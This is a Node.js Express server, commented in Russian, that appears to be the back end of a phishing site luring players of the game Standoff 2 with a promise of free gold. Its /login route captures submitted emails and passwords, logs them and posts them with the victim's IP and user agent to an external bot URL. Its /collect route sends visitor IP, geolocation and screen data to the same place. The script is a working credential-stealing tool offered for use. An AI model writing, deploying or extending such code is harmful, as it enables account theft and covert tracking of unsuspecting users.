const express = require('express');
const axios = require('axios');
const path = require('path');
const app = express();

// ===== НАСТРОЙКИ =====
const ADMIN_USER = 'admin';
const ADMIN_PASS = 'standoff2026';

// ⚠️ ВСТАВЬ СЮДА URL ОТ WISPBYTE (типа https://xxxx.wispbyte.com/notify)
const BOT_URL = 'https://ВСТАВЬ_URL_ОТ_WISPBYTE/notify';
const SECRET = 'standoff_secret_2026'; // должен совпадать с bot.js

// ===== EXPRESS =====
app.use(express.json());
app.use(express.static('public'));

function auth(req, res, next) {
    const b64 = (req.headers.authorization || '').split(' ')[1] || '';
    const [user, pass] = Buffer.from(b64, 'base64').toString().split(':');
    if (user === ADMIN_USER && pass === ADMIN_PASS) return next();
    res.set('WWW-Authenticate', 'Basic realm="Admin"');
    return res.status(401).send('Access denied');
}

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ===== СБОР ПОСЕТИТЕЛЕЙ =====
app.post('/collect', (req, res) => {
    const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').replace('::ffff:', '');
    const geo = req.body.geo || {};
    const screen = req.body.screen || {};

    console.log('👤 Посетитель: ' + ip + ' | ' + (geo.country || '?') + ', ' + (geo.city || '?'));

    axios.post(BOT_URL, {
        type: 'visitor',
        secret: SECRET,
        data: {
            ip: ip,
            country: geo.country,
            city: geo.city,
            org: geo.org,
            screen: (screen.w || '?') + 'x' + (screen.h || '?')
        }
    }).catch(err => console.error('Bot err:', err.message));

    res.json({ ok: true });
});

// ===== ЛОГИН =====
app.post('/login', (req, res) => {
    const { email, password } = req.body;
    const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').replace('::ffff:', '');
    const ua = req.headers['user-agent'] || 'unknown';

    if (!email || !password) return res.status(400).json({ error: 'Fill all fields' });

    console.log('🔐 Аккаунт: ' + email + ' : ' + password);

    axios.post(BOT_URL, {
        type: 'account',
        secret: SECRET,
        data: { email, password, ip, user_agent: ua }
    }).catch(err => console.error('Bot err:', err.message));

    res.json({ success: true, message: '500 gold added!' });
});

// ===== АДМИНКА =====
app.get('/admin', auth, (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.listen(3000, () => {
    console.log('Server started on http://localhost:3000');
});
